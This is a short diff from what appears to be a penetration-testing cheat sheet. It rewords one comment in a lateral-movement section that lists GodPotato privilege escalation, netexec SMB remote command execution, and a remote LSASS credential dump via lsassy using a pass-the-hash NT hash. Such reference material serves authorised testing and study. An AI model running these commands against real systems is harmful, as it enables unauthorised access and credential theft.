@@ -495,7 +495,7 @@ GodPotato -cmd "cmd /c whoami"
 Lateral movement & remote execution
 ++++++++++++++++++++++++++++++++++++++++
 nxc smb <ip_address> -u <user> -p <password> -x 'whoami'      # cmd  (-X = powershell)
-# Remote LSASS dump -> creds in memory (over SMB, nothing dropped to disk):
+# Remote LSASS dump -> creds parsed in memory (over SMB, no tool dropped to disk):
 # companion:gen lsass-dump-lsassy
 nxc smb <ip_address> -u <user> -H <NThash> -M lsassy
 # companion:end lsass-dump-lsassy
